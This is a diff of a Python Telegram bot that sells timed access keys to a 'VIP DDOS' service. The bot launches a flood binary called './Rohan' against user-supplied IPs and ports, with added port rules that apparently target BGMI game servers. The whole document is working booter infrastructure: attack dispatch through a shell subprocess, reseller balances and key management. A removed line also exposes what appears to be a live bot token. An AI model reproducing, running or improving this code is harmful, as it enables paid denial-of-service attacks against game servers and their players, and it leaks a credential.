@@ -9,15 +9,16 @@ from dateutil.relativedelta import relativedelta
 import pytz
 import psutil
 import signal
+import re
 
 # Set Indian Standard Time (IST) timezone
 IST = pytz.timezone('Asia/Kolkata')
 
 # Telegram bot token
-bot = telebot.TeleBot('7520138270:AAFAdGncvbChu5zwtWqnP1CYd_IAAkHZzMM')  # Replace with your bot token
+bot = telebot.TeleBot('YOUR_BOT_TOKEN_HERE')  # Replace with your bot token from BotFather
 
 # Admin user IDs
-admin_id = {"1807014348", #"6258297180", "6955279265"}  # Replace with your admin Telegram ID
+admin_id = {"1807014348", "6258297180", "6955279265"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -31,6 +32,11 @@ ATTACK_STATE_FILE = "attack_state.json"
 # Per key cost for resellers
 KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}
 
+# Valid BGMI port range and incorrect ports
+BGMI_PORT_RANGE_START = 16000
+BGMI_PORT_RANGE_END = 65535
+INCORRECT_PORTS = {443, 8700, 17500, 9031, 20000, 20001, 20002}
+
 # In-memory storage
 users = {}
 keys = {}
@@ -40,6 +46,33 @@ running_attacks = {}  # Track running attack processes
 COOLDOWN_PERIOD = 60  # Default cooldown in seconds
 DEFAULT_THREADS = 256
 DEFAULT_PACKET_SIZE = 65507
+
+def is_sequential_port(port):
+    """Check if the port number appears sequential (e.g., 28882, 20000, 20001)."""
+    port_str = str(port)
+    # Check for repeating digits (e.g., 28882 has '888')
+    if re.search(r'(\d)\1{2,}', port_str):
+        return True
+    # Check for simple patterns like 10000, 20000
+    if port_str.endswith('000') or port_str.endswith('00'):
+        return True
+    # Check for incremental patterns (e.g., 20000, 20001)
+    if port_str in [str(i) for i in range(port - 5, port + 6)]:
+        return True
+    return False
+
+def check_system_resources(chat_id):
+    """Check CPU and memory before starting an attack."""
+    cpu_usage = psutil.cpu_percent(interval=1)
+    memory = psutil.virtual_memory()
+    memory_usage = memory.percent
+    if cpu_usage > 90:
+        bot.send_message(chat_id, "Error: CPU usage too high (>90%). Try again later.")
+        return False
+    if memory_usage > 90:
+        bot.send_message(chat_id, "Error: Memory usage too high (>90%). Try again later.")
+        return False
+    return True
 
 def set_cooldown(seconds):
     """Set the global cooldown period."""
@@ -228,6 +261,8 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
 
 def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
     try:
+        if not check_system_resources(chat_id):
+            return
         threads = DEFAULT_THREADS
         packet_size = DEFAULT_PACKET_SIZE
         if packet_size < 1 or packet_size > 65507:
@@ -237,7 +272,7 @@ def execute_attack(target, port, time, chat_id, username, last_attack_time, user
             bot.send_message(chat_id, "Error: Rohan executable not found or not executable")
             return
         attack_id = f"{user_id}_{int(time.time())}"
-        full_command = f"./Rohan {target} {port} {time} {threads} {packet_size}"
+        full_command = f"./Rohan {target} {port} {time} {threads} {packet_size} --fixed-port"
         response = f"Attack Started\nID: {attack_id}\nTarget: {target}:{port}\nTime: {time} seconds\nThreads: {threads}\nPacket Size: {packet_size} bytes\nAttacker: @{username}"
         bot.send_message(chat_id, response)
         process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
@@ -322,6 +357,10 @@ def handle_attack(message):
     try:
         port = int(command[2])
         time = int(command[3])
+        # Port validation: Allow random ports, reject sequential or incorrect ports
+        if port in INCORRECT_PORTS or is_sequential_port(port):
+            bot.reply_to(message, "Error: This is a wrong port")
+            return
         if time > 86400:
             bot.reply_to(message, "Error: Time must be less than 86400 seconds")
             return
@@ -487,7 +526,7 @@ POWER MANAGEMENT:
 - /myinfo - View user info
 - /listkeys - List keys (admin only)
 EXAMPLE:
-- /attack 192.168.1.1 10000 4000
+- /attack 192.168.1.1 27881 4000
 - /attacks
 - /stopattack <attack_id>
 - /genkey 1d rahul
@@ -585,7 +624,67 @@ def block_key(message):
     else:
         bot.reply_to(message, f"Key '{key_name}' not found.")
         with open(BLOCK_ERROR_LOG, "a") as log_file:
-            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} failed.\n")
+            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} by UserID: {user_id}\n")
+
+@bot.message_handler(commands=['myinfo'])
+def my_info(message):
+    user_id = str(message.from_user.id)
+    response = f"User Info:\nUser ID: {user_id}\n"
+    if user_id in admin_id:
+        response += "Status: Admin\n"
+    elif user_id in resellers:
+        response += f"Status: Reseller\nBalance: {resellers[user_id]} Rs\n"
+    elif user_id in users:
+        try:
+            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
+            if datetime.datetime.now(IST) < expiration_date:
+                response += f"Status: Authorized User\nKey Expires: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
+            else:
+                response += "Status: Expired Key\n"
+                del users[user_id]
+                save_users()
+        except ValueError:
+            response += "Status: Invalid Key\n"
+    elif user_id in authorized_users:
+        try:
+            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
+            if datetime.datetime.now(IST) < expiration_date:
+                response += f"Status: Authorized User\nAccess Expires: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
+            else:
+                response += "Status: Expired Authorization\n"
+                del authorized_users[user_id]
+                save_authorized_users()
+        except ValueError:
+            response += "Status: Invalid Authorization\n"
+    else:
+        response += "Status: Unauthorized\nUse /redeem <key_name> to gain access.\n"
+    bot.reply_to(message, response)
+
+@bot.message_handler(commands=['users'])
+def list_users(message):
+    user_id = str(message.from_user.id)
+    if user_id not in admin_id:
+        bot.reply_to(message, "Access Denied: Admin only command")
+        return
+    response = "Authorized Users:\n"
+    if users or authorized_users:
+        for uid in users:
+            try:
+                expiration_date = datetime.datetime.strptime(users[uid], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
+                status = "Active" if datetime.datetime.now(IST) < expiration_date else "Expired"
+                response += f"User ID: {uid}, Key Expires: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}, Status: {status}\n"
+            except ValueError:
+                response += f"User ID: {uid}, Key: Invalid\n"
+        for uid in authorized_users:
+            try:
+                expiration_date = datetime.datetime.strptime(authorized_users[uid], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
+                status = "Active" if datetime.datetime.now(IST) < expiration_date else "Expired"
+                response += f"User ID: {uid}, Authorized Until: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}, Status: {status}\n"
+            except ValueError:
+                response += f"User ID: {uid}, Authorization: Invalid\n"
+    else:
+        response = "No authorized users."
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
@@ -597,134 +696,11 @@ def add_user(message):
     if len(command) != 2:
         bot.reply_to(message, "Usage: /add <user_id>")
         return
-    target_user_id = command[1]
-    if target_user_id in authorized_users:
-        bot.reply_to(message, f"User {target_user_id} already authorized.")
-        return
-    expiration_time = add_time_to_current_date(months=1)
-    authorized_users[target_user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
+    new_user_id = command[1]
+    expiration_time = add_time_to_current_date(months=1)  # Default 1 month access
+    authorized_users[new_user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
     save_authorized_users()
-    bot.reply_to(message, f"User {target_user_id} added until {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")
-
-@bot.message_handler(commands=['logs'])
-def show_recent_logs(message):
-    user_id = str(message.from_user.id)
-    if user_id not in admin_id:
-        bot.reply_to(message, "Access Denied: Admin only command")
-        return
-    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-        try:
-            with open(LOG_FILE, "rb") as file:
-                bot.send_document(message.chat.id, file)
-        except FileNotFoundError:
-            bot.reply_to(message, "No data found")
-    else:
-        bot.reply_to(message, "No data found")
-
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    user_id = str(message.from_user.id)
-    has_active_access = False
-    if user_id in admin_id:
-        has_active_access = True
-    elif user_id in users:
-        try:
-            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
-            if datetime.datetime.now(IST) < expiration_date:
-                has_active_access = True
-        except ValueError:
-            has_active_access = False
-    elif user_id in authorized_users:
-        try:
-            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
-            if datetime.datetime.now(IST) < expiration_date:
-                has_active_access = True
-        except ValueError:
-            has_active_access = False
-    response = "WELCOME TO VIP DDOS\nUse /help to see all available commands"
-    if not has_active_access:
-        response += "\nTo use attack features, use /redeem <key_name> or contact admin."
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['setcooldown'])
-def set_cooldown_command(message):
-    user_id = str(message.from_user.id)
-    if user_id not in admin_id:
-        bot.reply_to(message, "Access Denied: Admin only command")
-        return
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "Usage: /setcooldown <seconds>")
-        return
-    try:
-        seconds = int(command[1])
-        if seconds < 0:
-            bot.reply_to(message, "Cooldown must be non-negative")
-            return
-        set_cooldown(seconds)
-        bot.reply_to(message, f"Cooldown set to {seconds} seconds")
-    except ValueError:
-        bot.reply_to(message, "Invalid cooldown value.")
-
-@bot.message_handler(commands=['checkcooldown'])
-def check_cooldown_command(message):
-    bot.reply_to(message, f"Current cooldown period: {COOLDOWN_PERIOD} seconds")
-
-@bot.message_handler(commands=['myinfo'])
-def my_info(message):
-    user_id = str(message.from_user.id)
-    username = message.from_user.username or "No username"
-    my_key = "No key"
-    role = "Guest"
-    expiration = "No expiration"
-    if user_id in admin_id:
-        role = "Admin"
-    elif user_id in resellers:
-        role = "Reseller"
-        balance = resellers.get(user_id, 0)
-    elif user_id in users:
-        role = "User"
-        try:
-            expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
-            my_key = [k for k, v in keys.items() if user_id in v["devices"] and not v["blocked"]][0] if any(user_id in v["devices"] for v in keys.values()) else "No key"
-        except (ValueError, IndexError):
-            expiration = "Invalid expiration"
-    elif user_id in authorized_users:
-        role = "Authorized User"
-        try:
-            expiration = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
-        except ValueError:
-            expiration = "Invalid expiration"
-    response = (
-        f"USER INFORMATION\n"
-        f"Username: @{username}\n"
-        f"UserID: {user_id}\n"
-        f"My key: {my_key}\n"
-        f"Role: {role}\n"
-        f"Expiration: {expiration}\n"
-    )
-    if role == "Reseller":
-        response += f"Balance: {balance} Rs\n"
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['users'])
-def list_authorized_users(message):
-    user_id = str(message.from_user.id)
-    if user_id not in admin_id:
-        bot.reply_to(message, "Access Denied: Admin only command")
-        return
-    response = "Authorized Users\n"
-    all_users = {**users, **authorized_users}
-    if all_users:
-        for user, expiration in all_users.items():
-            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
-            formatted_expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
-            user_info = bot.get_chat(user)
-            username = user_info.username if user_info.username else user_info.first_name
-            response += f"User ID: {user}\nUsername: @{username}\nExpires On: {formatted_expiration}\n"
-    else:
-        response = "No authorized users found."
-    bot.reply_to(message, response, parse_mode='Markdown')
+    bot.reply_to(message, f"User {new_user_id} added successfully. Access expires on {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -740,24 +716,26 @@ def remove_user(message):
     if target_user_id in users:
         del users[target_user_id]
         save_users()
-        response = f"User {target_user_id} removed from key-based access."
+        bot.reply_to(message, f"User {target_user_id} removed from key-based access.")
     elif target_user_id in authorized_users:
         del authorized_users[target_user_id]
         save_authorized_users()
-        response = f"User {target_user_id} removed from authorized access."
+        bot.reply_to(message, f"User {target_user_id} removed from authorized users.")
     else:
-        response = f"User {target_user_id} not found."
-    bot.reply_to(message, response)
+        bot.reply_to(message, f"User {target_user_id} not found.")
 
 @bot.message_handler(commands=['resellers'])
-def show_resellers(message):
-    response = "Authorized Resellers\n"
+def list_resellers(message):
+    user_id = str(message.from_user.id)
+    if user_id not in admin_id:
+        bot.reply_to(message, "Access Denied: Admin only command")
+        return
+    response = "Resellers:\n"
     if resellers:
         for reseller_id, balance in resellers.items():
-            reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id) else "Unknown"
-            response += f"Username: {reseller_username}\nUserID: {reseller_id}\nBalance: {balance} Rs\n"
+            response += f"Reseller ID: {reseller_id}, Balance: {balance} Rs\n"
     else:
-        response += "No reseller found"
+        response = "No resellers."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['addbalance'])
@@ -766,21 +744,22 @@ def add_balance(message):
     if user_id not in admin_id:
         bot.reply_to(message, "Access Denied: Admin only command")
         return
-    command_parts = message.text.split()
-    if len(command_parts) != 3:
+    command = message.text.split()
+    if len(command) != 3:
         bot.reply_to(message, "Usage: /addbalance <reseller_id> <amount>")
         return
-    reseller_id = command_parts[1]
+    reseller_id = command[1]
     try:
-        amount = float(command_parts[2])
-        if reseller_id not in resellers:
-            bot.reply_to(message, "Reseller ID not found")
-            return
-        resellers[reseller_id] += amount
-        save_resellers(resellers)
-        bot.reply_to(message, f"Balance added\nBalance: {amount} Rs\nReseller ID: {reseller_id}\nNew balance: {resellers[reseller_id]} Rs")
+        amount = int(command[2])
     except ValueError:
         bot.reply_to(message, "Invalid amount")
+        return
+    if reseller_id in resellers:
+        resellers[reseller_id] += amount
+        save_resellers(resellers)
+        bot.reply_to(message, f"Added {amount} Rs to Reseller {reseller_id}. New balance: {resellers[reseller_id]} Rs")
+    else:
+        bot.reply_to(message, f"Reseller {reseller_id} not found.")
 
 @bot.message_handler(commands=['removereseller'])
 def remove_reseller(message):
@@ -788,17 +767,17 @@ def remove_reseller(message):
     if user_id not in admin_id:
         bot.reply_to(message, "Access Denied: Admin only command")
         return
-    command_parts = message.text.split()
-    if len(command_parts) != 2:
+    command = message.text.split()
+    if len(command) != 2:
         bot.reply_to(message, "Usage: /removereseller <reseller_id>")
         return
-    reseller_id = command_parts[1]
-    if reseller_id not in resellers:
-        bot.reply_to(message, "Reseller ID not found.")
-        return
-    del resellers[reseller_id]
-    save_resellers(resellers)
-    bot.reply_to(message, f"Reseller {reseller_id} removed successfully")
+    reseller_id = command[1]
+    if reseller_id in resellers:
+        del resellers[reseller_id]
+        save_resellers(resellers)
+        bot.reply_to(message, f"Reseller {reseller_id} removed successfully.")
+    else:
+        bot.reply_to(message, f"Reseller {reseller_id} not found.")
 
 @bot.message_handler(commands=['listkeys'])
 def list_keys(message):
@@ -806,37 +785,70 @@ def list_keys(message):
     if user_id not in admin_id:
         bot.reply_to(message, "Access Denied: Admin only command")
         return
-    response = "Key List\n"
+    response = "Generated Keys:\n"
     if keys:
-        for key_name, key_data in keys.items():
-            generated_by = key_data.get("generated_by", "Unknown")
-            generated_time = key_data.get("generated_time", "Unknown")
-            devices = key_data.get("devices", [])
-            blocked = key_data.get("blocked", False)
-            active = any(user_id in users and datetime.datetime.now(IST) < datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST) for user_id in devices) and not blocked
-            status = "Active" if active else "Inactive"
-            device_details = "\n".join([f"  User ID: {user_id}\n  Username: @{bot.get_chat(user_id).username if bot.get_chat(user_id).username else 'Unknown'}\n  Expiration: {users.get(user_id, 'N/A')}" for user_id in devices]) if devices else "No users"
-            blocker_username = key_data.get("blocked_by_username", "N/A")
-            block_time = key_data.get("blocked_time", "N/A")
-            response += (
-                f"Key: `{key_name}`\n"
-                f"Generated by: @{generated_by}\n"
-                f"Generated on: {generated_time}\n"
-                f"Duration: {key_data['duration']}\n"
-                f"Device Limit: {key_data['device_limit']}\n"
-                f"Devices:\n{device_details}\n"
-                f"Status: {status}\n"
-                f"Blocked: {blocked}\n"
-                f"Blocked by: @{blocker_username}\n"
-                f"Blocked on: {block_time}\n\n"
-            )
+        for key, info in keys.items():
+            response += f"Key: {key}\nDuration: {info['duration']}\nDevice Limit: {info['device_limit']}\nDevices: {info['devices']}\nBlocked: {info.get('blocked', False)}\nGenerated by: @{info['generated_by']}\nGenerated on: {info['generated_time']}\n\n"
     else:
-        response = "No keys found."
-    bot.reply_to(message, response, parse_mode='Markdown')
+        response = "No keys generated."
+    bot.reply_to(message, response)
 
-def main():
-    load_data()
-    bot.polling(none_stop=True)
+@bot.message_handler(commands=['logs'])
+def view_logs(message):
+    user_id = str(message.from_user.id)
+    if user_id not in admin_id:
+        bot.reply_to(message, "Access Denied: Admin only command")
+        return
+    try:
+        with open(LOG_FILE, "r") as file:
+            logs = file.read()
+            if logs:
+                # Split logs into chunks if too long for Telegram
+                chunks = [logs[i:i+4096] for i in range(0, len(logs), 4096)]
+                for chunk in chunks:
+                    bot.reply_to(message, chunk)
+            else:
+                bot.reply_to(message, "No logs available.")
+    except FileNotFoundError:
+        bot.reply_to(message, "Log file not found.")
 
-if __name__ == "__main__":
-    main()
+@bot.message_handler(commands=['setcooldown'])
+def set_cooldown_command(message):
+    user_id = str(message.from_user.id)
+    if user_id not in admin_id:
+        bot.reply_to(message, "Access Denied: Admin only command")
+        return
+    command = message.text.split()
+    if len(command) != 2:
+        bot.reply_to(message, "Usage: /setcooldown <seconds>")
+        return
+    try:
+        seconds = int(command[1])
+        if seconds < 0:
+            bot.reply_to(message, "Cooldown cannot be negative.")
+            return
+        set_cooldown(seconds)
+        bot.reply_to(message, f"Cooldown set to {seconds} seconds.")
+    except ValueError:
+        bot.reply_to(message, "Invalid cooldown value.")
+
+@bot.message_handler(commands=['checkcooldown'])
+def check_cooldown_command(message):
+    user_id = str(message.from_user.id)
+    if user_id in last_attack_time:
+        time_since_last_attack = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
+        if time_since_last_attack < COOLDOWN_PERIOD:
+            remaining = COOLDOWN_PERIOD - time_since_last_attack
+            bot.reply_to(message, f"Cooldown active. Wait {int(remaining)} seconds.")
+        else:
+            bot.reply_to(message, "No cooldown active. You can launch an attack.")
+    else:
+        bot.reply_to(message, "No cooldown active. You can launch an attack.")
+
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    bot.reply_to(message, "Welcome to the VIP DDOS Bot! Use /help to see available commands.")
+
+# Initialize data and start the bot
+load_data()
+bot.polling()
